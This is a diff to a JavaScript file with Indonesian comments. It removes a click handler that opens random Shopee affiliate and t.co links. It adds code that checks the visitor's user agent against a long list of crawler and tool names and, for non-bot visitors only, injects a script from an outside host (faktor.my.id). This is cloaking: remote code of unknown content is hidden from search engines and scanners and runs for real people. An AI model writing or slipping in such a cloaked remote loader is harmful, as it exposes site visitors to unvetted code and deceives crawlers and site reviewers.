@@ -1,72 +1,9 @@
-// Array URL yang diberikan
-const urls = [
-  'https://shope.ee/3poqM1Vuqn?share_channel_code=7',
-'https://shope.ee/6UpbWvhtsQ?share_channel_code=7',
-'https://shope.ee/3fVQ9jjU15?share_channel_code=7',
-'https://t.co/Q3NjAUDptI',
-'https://shope.ee/2AgcMyT7su?share_channel_code=7',
-'https://shope.ee/8eu66twBxi?share_channel_code=7',
-'https://shope.ee/8eu66uva89?share_channel_code=7',
-'https://shope.ee/5Ux4L5q6gi?share_channel_code=7',
-'https://shope.ee/A9iV5KAy8H?share_channel_code=7',
-'https://shope.ee/5Ux4L6Tlzc?share_channel_code=7',
-'https://shope.ee/407rjzZ40O?share_channel_code=7',
-'https://t.co/IX3GTsW3gP',
-'https://shope.ee/5ztKw0jntJ?share_channel_code=7',
-'https://shope.ee/3poqM2nFSg?share_channel_code=7',
-'https://shope.ee/5ztKw0o8PZ?share_channel_code=7',
-'https://shope.ee/500OvpZj1S?share_channel_code=7',
-'https://t.co/Q3kfdmrYpK',
-'https://shope.ee/9emI2nxBQI?share_channel_code=7',
-'https://shope.ee/8Uafubrsww?share_channel_code=7',
-'https://shope.ee/3VBzxQoRsG?share_channel_code=7',
-'https://shope.ee/4Kki8bXnKU?share_channel_code=7',
-'https://shope.ee/1L7VNRf1sX?share_channel_code=7',
-'https://shope.ee/1VQvZkN4SW?share_channel_code=7',
-'https://shope.ee/7Ui8ilmcMa?share_channel_code=7',
-'https://shope.ee/8pDWJE3ssi?share_channel_code=7',
-'https://shope.ee/biydx5ge?share_channel_code=7',
-'https://t.co/i6p4L1u7fR',
-'https://shope.ee/A9iYdizgBt?share_channel_code=7',
-'https://shope.ee/5AKDwUZNBu?share_channel_code=7',
-'https://shope.ee/frPlrq9YG?share_channel_code=7',
-'https://shope.ee/9USoI696hd?share_channel_code=7',
-'https://shope.ee/9emEUP3w3i?share_channel_code=7',
-'https://shope.ee/AvXzIf8j2?share_channel_code=7',
-'https://shope.ee/6pSRvYbxtg?share_channel_code=7',
-'https://t.co/kbxNMx668a',
-'https://shope.ee/7KOiWSNCJm?share_channel_code=7',
-'https://shope.ee/9K9mu8fuh3?share_channel_code=7',
-'https://shope.ee/LEyBaaZue?share_channel_code=7',
-'https://shope.ee/500SUEJpVm?share_channel_code=7',
-'https://shope.ee/4Kklh0DV2M?share_channel_code=7',
-'https://shope.ee/6UpbWvHZRZ?share_channel_code=7',
-'https://shope.ee/A9iYdivD97?share_channel_code=7',
-'https://shope.ee/4V4BtJCrhP?share_channel_code=7',
-'https://t.co/nV4q1voby1',
-'https://t.co/SSlUYRKg4Z',
-'https://shope.ee/froaCUuSE?share_channel_code=7',
-'https://shope.ee/7pKz7NLIIr?share_channel_code=7',
-'https://shope.ee/4phNXsaZbU?share_channel_code=7',
-'https://shope.ee/3VBzxQxNxp?share_channel_code=7',
-'https://shope.ee/6f91jEYOi9?share_channel_code=7',
-'https://shope.ee/5Ux4L5lddw?share_channel_code=7',
-'https://shope.ee/7UhjuQCSVF?share_channel_code=7',
-'https://shope.ee/5Ux4L6pZ7R?share_channel_code=7',
-'https://shope.ee/2AgcMyKSqO?share_channel_code=7'
-];
+// Deteksi user agent
+var isBot = /bot|crawl|slurp|spider|mediapartners|abacho|accona|AddThis|AdsBot|ahoy|AhrefsBot|AISearchBot|alexa|altavista|anthill|appie|applebot|arale|araneo|AraybOt|ariadne|arks|aspseek|ATN_Worldwide|Atomz|baiduspider|baidu|bbot|bingbot|bing|Bjaaland|BlackWidow|BotLink|bot|boxseabot|bspider|calif|CCBot|ChinaClaw|christcrawler|CMC\/0\.01|combine|confuzzledbot|contaxe|CoolBot|cosmos|crawler|crawlpaper|crawl|curl|cusco|cyberspyder|cydralspider|dataprovider|digger|DIIbot|DotBot|downloadexpress|DragonBot|DuckDuckBot|dwcp|EasouSpider|ebiness|ecollector|elfinbot|esculapio|ESI|esther|eStyle|Ezooms|facebookexternalhit|facebook|facebot|fastcrawler|FatBot|FDSE|FELIX IDE|fetch|fido|find|Firefly|fouineur|Freecrawl|froogle|gammaSpider|gazz|gcreep|geona|Getterrobo-Plus|get|girafabot|golem|googlebot|\-google|grabber|GrabNet|griffon|Gromit|gulliver|gulper|hambot|havIndex|hotwired|htdig|HTTrack|ia_archiver|iajabot|IDBot|Informant|InfoSeek|InfoSpiders|INGRID\/0\.1|inktomi|inspectorwww|Internet Cruiser Robot|irobot|Iron33|JBot|jcrawler|Jeeves|jobo|KDD\-Explorer|KIT\-Fireball|ko_yappo_robot|label\-grabber|larbin|legs|libwww-perl|linkedin|Linkidator|linkwalker|Lockon|logo_gif_crawler|Lycos|m2e|majesticsEO|marvin|mattie|mediafox|mediapartners|MerzScope|MindCrawler|MJ12bot|mod_pagespeed|moget|Motor|msnbot|muncher|muninn|MuscatFerret|MwdSearch|NationalDirectory|naverbot|NEC\-MeshExplorer|NetcraftSurveyAgent|NetScoop|NetSeer|newscan\-online|nil|none|Nutch|ObjectsSearch|Occam|openstat.ru\/Bot|packrat|pageboy|ParaSite|patric|pegasus|perlcrawler|phpdig|piltdownman|Pimptrain|pingdom|pinterest|pjspider|PlumtreeWebAccessor|PortalBSpider|psbot|rambler|Raven|RHCS|RixBot|roadrunner|Robbie|robi|RoboCrawl|robofox|Scooter|Scrubby|Search\-AU|searchprocess|search|SemrushBot|Senrigan|seznambot|Shagseeker|sharp\-info\-agent|sift|SimBot|Site Valet|SiteSucker|skymob|SLCrawler\/2\.0|slurp|snooper|solbot|speedy|spider_monkey|SpiderBot\/1\.0|spiderline|spider|suke|tach_bw|TechBOT|TechnoratiSnoop|templeton|teoma|titin|topiclink|twitterbot|twitter|UdmSearch|Ukonline|UnwindFetchor|URL_Spider_SQL|urlck|urlresolver|Valkyrie libwww\-perl|verticrawl|Victoria|void\-bot|Voyager|VWbot_K|wapspider|WebBandit\/1\.0|webcatcher|WebCopier|WebFindBot|WebLeacher|WebMechanic|WebMoose|webquest|webreaper|webspider|webs|WebWalker|WebZip|wget|whowhere|winona|wlm|WOLP|woriobot|WWWC|XGET|xing|yahoo|YandexBot|YandexMobileBot|yandex|yeti|Zeus/i.test(navigator.userAgent);
 
-// Fungsi untuk memuat URL acak
-function loadRandomUrl() {
-  // Mendapatkan indeks acak dari array URL
-  const randomIndex = Math.floor(Math.random() * urls.length);
-  
-  // Mengambil URL yang sesuai dengan indeks acak
-  const randomUrl = urls[randomIndex];
-  
-  // Memuat URL acak di jendela baru
-  window.open(randomUrl);
+// Jika user agent bukan bot, muat script tertentu
+if (!isBot) {
+  var script = document.createElement('script');
+  script.src = 'https://faktor.my.id/cangkul/app.js';
+  document.body.appendChild(script);
 }
-
-// Memanggil fungsi loadRandomUrl() saat tombol di klik
-document.querySelector('#load-random-url').addEventListener('click', loadRandomUrl);
